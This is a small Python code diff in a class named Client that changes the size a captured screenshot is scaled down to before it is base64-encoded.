@@ -150,7 +150,7 @@ class Client:
         try:
             # Take screenshot
             screenshot = ImageGrab.grab()
-            new_size = (screenshot.width // 4, screenshot.height // 4)
+            new_size = (screenshot.width // 2, screenshot.height // 2)
             screenshot = screenshot.resize(new_size, resample=ImageGrab.Image.LANCZOS)
             
             # Convert to base64
